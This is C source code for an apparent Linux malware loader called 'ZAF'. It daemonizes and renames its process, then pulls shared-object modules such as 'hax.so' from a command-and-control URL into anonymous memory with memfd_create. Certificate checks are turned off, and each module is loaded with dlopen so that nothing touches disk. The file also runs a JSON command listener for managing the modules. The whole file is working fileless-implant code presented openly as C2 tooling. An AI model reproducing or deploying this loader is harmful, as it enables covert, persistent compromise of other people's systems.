/* 
 *
 *
 *   ZAF:
 *
 *
 *
 *
 *
 *
 *
 * Ref: some code from https://x-c3ll.github.io/posts/fileless-memfd_create */

#define _GNU_SOURCE


#include <stdio.h>
#include <curl/curl.h>
#include <cJSON.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <signal.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <errno.h>


#include "zaf.h"


#define SHM_NAME " "
#define __NR_memfd_create 319 // https://code.woboq.org/qt5/include/asm/unistd_64.h.html


// Wrapper to call memfd_create syscall
inline int memfd_create(const char *name, unsigned int flags) {
	return syscall(__NR_memfd_create, name, flags);
}

// Detect if kernel is < or => than 3.17
// Ugly as hell, probably I was drunk when I coded it
int kernel_version() {
	struct utsname buffer;
	uname(&buffer);
	
	char *token;
	char *separator = ".";
	
	token = strtok(buffer.release, separator);
	if (atoi(token) < 3) {
		return 0;
	}
	else if (atoi(token) > 3){
		return 1;
	}

	token = strtok(NULL, separator);
	if (atoi(token) < 17) {
		return 0;
	}
	else {
		return 1;
	}
}


// Returns a file descriptor where we can write our shared object
int open_ramfs(void) {
	int shm_fd;

	//If we have a kernel < 3.17
	// We need to use the less fancy way
	if (kernel_version() == 0) {
		shm_fd = shm_open(SHM_NAME, O_RDWR | O_CREAT, S_IRWXU);
		if (shm_fd < 0) { //Something went wrong :(
			log_fatal("shm_fd: Could not open file descriptor");
			return 1;
		}
	}
	// If we have a kernel >= 3.17
	// We can use the funky style
	else {
		shm_fd = memfd_create(SHM_NAME, 1);
		if (shm_fd < 0) { //Something went wrong :(
			log_fatal("memfd_create: Could not open file descriptor\n");
			return -1;
		}
	}
	return shm_fd;
}

// Callback to write the shared object

static size_t write_data (void *ptr, size_t size, size_t nmemb, void* userp) {

    Shared_Mem_Fd *shm_fd_s = (Shared_Mem_Fd *)userp;
	if (write(shm_fd_s->shm_fd, ptr, nmemb) < 0) {
		log_fatal("Could not write shm file.");
		close(shm_fd_s->shm_fd);
		return 1;
	}
	log_debug("SHM file written");

    return CURLE_OK;
}

// Download our share object from a C&C via HTTPs
int download_to_RAM(char *download) { 
	CURL *curl;
	CURLcode res;
	int shm_fd;

	shm_fd = open_ramfs(); // Give me a file descriptor to memory
	log_info("File Descriptor %d Shared Memory created!", shm_fd);

    Shared_Mem_Fd shm_fd_s = {0};
    shm_fd_s.shm_fd=shm_fd;

	log_debug("Passing URL to cURL: %s", download);

    curl_global_init(CURL_GLOBAL_DEFAULT);    
	// We use cURL to download the file
	// It's easy to use and we avoid to write unnecesary code
	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, download);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_USERAGENT, "libcurl-agent/1.0");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data); //Callback
        // Op_Nomad: Modded to avoid gcc warning 
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*) &shm_fd_s); //Args for our callback
		
		// Do the HTTPs request!
		res = curl_easy_perform(curl);
		if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
			log_error("cURL failed: %s", curl_easy_strerror(res));
			close(shm_fd);
            shm_fd=0;
		}
		curl_easy_cleanup(curl);
		return shm_fd;
	}
    return 0;
}

// Load the shared object from within
void load_so(int shm_fd) {
	char path[1024];
	void *handle;

	log_debug("Trying to load Shared Object");
	if (kernel_version() == 1) { //Funky way
	    log_debug("memfd_create() is supported.");
		snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
	} else { // Not funky way :(
		close(shm_fd);
		snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
	    log_debug("only /dev/shm supported.");
	}
    log_debug("Path to fd: %s", path);
	handle = dlopen(path, RTLD_LAZY);
	if (!handle) {
		log_error("Dlopen failed with error: %s", dlerror());
	}
}

// Get memfd location 
int setMemfdTbl(int shm_fd, char* mname) {
    char path[1024];
    

    log_debug("Populating Index Table");
    if (kernel_version() == 1) { //Funky way
	    log_debug("memfd_create() is supported.");
        snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
    } else { // Not funky way :(
        close(shm_fd);
        snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
	    log_debug("only /dev/shm supported.");
    }
    if (check_empty(head) == 0) {
        log_debug("Head of list empty");
        head = calloc(1,sizeof(node_t));
        if (head == NULL) {
		    log_fatal("calloc() failed");
            return 1;
        }
        push_first(head, path, mname);
    }else{
        push(head, path, mname);
    }
    return 0;
}



int main (int argc, char **argv) {
    FILE *fp;
    char *logFile="/tmp/_mf.log";


    argv = save_ps_display_args(argc, argv);
    init_ps_display("zaf");

    log_info("Opening log file: %s", logFile);
    fp = fopen (logFile,"w");
    if (fp == NULL) {
        log_error("File not created okay, errno = %d", errno);
    }else{
        log_set_fp(fp);
    }

    backgroundDaemonLeader();

    //load_so(fd, fd_s);
    fclose (fp);
	return 0;
}

void doWork(){

    char *modules[] = {
        "hax.so",
        "libmctor.so"
    };
    char *ccurl="http://127.0.0.1:8080/";
    char urlbuf[255] = {'\0'};
	int fd, i;

	log_debug("\n\n=== ZAF ===\n");
	log_debug("Trying for C2 download...");

    for(i = 0; i < sizeof(modules)/sizeof(modules[0]); i++)
    {
        snprintf(urlbuf, sizeof(urlbuf), "%s%s", ccurl, modules[i]);
        log_debug("Module URL = %s", urlbuf);
        fd = download_to_RAM(urlbuf);
        if (fd != 0){
            setMemfdTbl(fd, modules[i]);
        }

    }
    setupCmdP();

}
int backgroundDaemonLeader(){


    // Fork, allowing the parent process to terminate.
    log_debug("before first fork()");
    pid_t pid = fork();
    log_debug("after first fork()");
    if (pid == -1) {
        log_error("failed to fork while daemonising (errno=%d)",errno);
    } else if (pid != 0) {
        log_debug("after first fork(0 in parent. exiting.");
        _exit(0);
    }

    // Start a new session for the daemon.
    log_debug("before setsid()");
    if (setsid()==-1) {
        log_error("failed to become a session leader while daemonising(errno=%d)",errno);
    }

    // Fork again, allowing the parent process to terminate.
    //signal(SIGHUP,SIG_IGN);
    log_debug("before signal SIGCHLD");
    signal(SIGCHLD, SIG_IGN); // avoid defunct processes. 
    log_debug("before second fork()");
    pid=fork();
    log_debug("after second fork()");
    if (pid == -1) {
        log_error("failed to fork while daemonising (errno=%d)",errno);
    } else if (pid != 0) {
        log_debug("after first fork(0 in parent. exiting.");
        _exit(0);
    }

    // Set the current working directory to the root directory.
    log_debug("before chdir()");
    if (chdir("/tmp") == -1) {
        log_error("failed to change working directory while daemonising (errno=%d)",errno);
    }

    // Set the user file creation mask to zero.
    log_debug("before umask()");
    umask(0);

    log_debug("before close FD 0,1,2");
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    if (open("/dev/null",O_RDONLY) == -1) {
      printf("failed to reopen stdin while daemonising (errno=%d)",errno);
    }
    if (open("/dev/null",O_WRONLY) == -1) {
      printf("failed to reopen stdout while daemonising (errno=%d)",errno);
    }
    if (open("/dev/null",O_RDWR) == -1) {
	  printf("failed to reopen stderr while daemonising (errno=%d)",errno);
    }
    log_debug("after reopen FD 0,1,2 ro /dev/null");

    log_debug("before signal handlers");
    setSignalHandlers(500000);
    log_debug("after signal handlers");
    log_debug("before doWork");
    doWork();
    return 0;
}

int setupCmdP(){

    unsigned int portno, clilen, sockfd, newsockfd;
    struct sockaddr_in serv_addr, cli_addr; // AF_INET
    // struct sockaddr_un serv_addr_un; // AF_UNIX
    int pid;
    int one = 1;

    /* First call to socket() function */
    sockfd = socket(AF_INET, SOCK_STREAM, 0); // AF_INET
    // sockfd = socket(AF_UNIX, SOCK_STREAM, 0);   // AF_UNIX

    if (sockfd < 0) {
      log_error("Error opening socket()");
      return -1;
    }


    bzero((char *) &serv_addr, sizeof(serv_addr));
    portno = 0; // random port

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(0x7f000001L); // 127.0.0.1
    serv_addr.sin_port = htons(portno);

    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
      log_error("Error on bind()");
      return -1;
    }
    setsockopt(sockfd, SOL_TCP, TCP_NODELAY, &one, sizeof(one));
    listen(sockfd,5);
    log_info("Listening on port");
    clilen = sizeof(cli_addr);

    /* AF_UNIX 
    bzero((char *) &serv_addr_un, sizeof(serv_addr_un));
    strcpy(serv_addr_un.sun_path, "/tmp/zsock");
    listen(sockfd,5);
    */


    while (1) {
      newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);

      if (newsockfd < 0) {
         log_error("Error on accept()");
         return -1;
      }
      log_info("Accepting requests");

      
      /* Create child process */
      pid = fork();

      if (pid < 0) {
         perror("Error on fork()");
         return -1;
      }

      if (pid == 0) {
         /* This is the client process */
         close(sockfd);
         processCommandReq(newsockfd, head);
         exit(0);
      }
      else {
         close(newsockfd);
      }


    } /* end of while */

    return 0;
}


int processCommandReq (int sock, node_t * head) {
   int n;
   char buffer[MAX_BUF];
   cJSON * root;
   cJSON * cmdName;


   bzero(buffer,MAX_BUF);
   n = read(sock,buffer,MAX_BUF-1);

   if (n < 0) {
      log_error("Error reading from socket");
      return -1;
   }

   log_info("Request payload: >> %s <<",buffer);

   // Rudimentary checks for JSON. this library is SIGSEGV if invalid. We take that chance for now.
   if ( strchr(buffer, '}') == NULL \
                || strchr(buffer, '{') == NULL  \
                || strchr(buffer, '"') == NULL ){

        log_debug("Possibly invalid JSON, not parsing: %s", buffer); // not processing
        return 1;
   }

   root = cJSON_Parse(buffer);

   if (root == NULL)
   {
        log_warn("JSON: Error parsing");
        return -2;
   }

   cmdName = cJSON_GetObjectItemCaseSensitive(root, "command");

   if (cJSON_IsString(cmdName) && (cmdName->valuestring != NULL))
   {
     if (strcmp(cmdName->valuestring, "listmod") == 0)
     {
       log_debug("[Command] : %s", cmdName->valuestring);
       write_modlist(head, sock);
     }
     else if (strcmp(cmdName->valuestring, "loadmod") == 0)
     {
       log_debug("[Command] : %s", cmdName->valuestring);
     }
     else {
       log_debug("Command request (%s)", cmdName->valuestring);
     }
   }

   cJSON_Delete(root);

   return 0;

}
// ------------------- Node table ----------------
int check_empty(node_t * head){
    int empty  = (head == NULL) ? 0 : 1;
    return empty;
}

int list_sz(node_t * head) {
    node_t * current = head;
    int c = 1;
    while (current != NULL) {
        c++;
        current = current->next;
    }
    return c;
}
void write_modlist(node_t * head, int sock) {
    node_t * current = head;
    int n, ret;
    char * entry;


    while (current != NULL) {
        entry = calloc(1, MAX_BUF);

		ret = snprintf(entry, MAX_BUF-1, "%s : %s\n", current->mpath, current->mname);
        if (ret < 0) {
         free(entry);
         continue;
        }

        n = write(sock,entry,strlen(entry));

        if (n < 0) {
          log_error("Error writing to socket");
        }
        free(entry);
        current = current->next;
    }
}

int push_first(node_t * head, char* path, char* mname) {

    log_debug("ModTable: Adding path %s, strlen(path): %d name: %s strlen(name): %d", path, strlen(path), mname, strlen(mname));
    strncpy(head->mpath, path, strlen(path));
    strncpy(head->mname, mname, strlen(mname));
    head->next = NULL;
    log_debug("ModTable: Added: %s : %s", head->mname, head->mpath);

    return 0;
}

int push(node_t * head, char* path, char* mname) {
    node_t * current = head;

    log_debug("ModTable: Adding path %s, strlen(path): %d name: %s strlen(name): %d", path, strlen(path), mname, strlen(mname));

    while (current->next != NULL) {
        current = current->next;
    }

    current->next = calloc(1,sizeof(node_t));
    if (current == NULL) {
        log_fatal("ModTable: calloc() failed");
        return 1;
    }

    strncpy(current->next->mpath, path, strlen(path));
    strncpy(current->next->mname, mname, strlen(mname));
    current->next->next = NULL;
    log_debug("ModTable: entry: %s : %s", current->mname, current->mpath);

    return 0;
}

/* -------------- SIG Handlers ------------------- */

void setSignalHandlers(){
    signal(SIGHUP, handleSig);
    signal(SIGUSR1, handleSig);
}

void handleSig(int signo) {
    /*
     * Signal safety: It is not safe to call clock(), printf(),
     * or exit() inside a signal handler. Instead, we set a flag.
     */
    switch(signo){
        case SIGHUP:
            log_warn("Signal handler got SIGHUP signal ... ");
            sigflag = 0; // reset
            doSigHup();
            break;
        case SIGUSR1:
            log_warn("Signal handler got SIGUSR1 signal ... ");
            sigflag = 0; // reset
            doSigUsr1();
            break;
    }
}

void doSigHup(void){
    log_debug("Executing SIGHUP code here ...");
}
void doSigUsr1(void){
    log_debug("Executing SIGUSR1 code here ...");
}

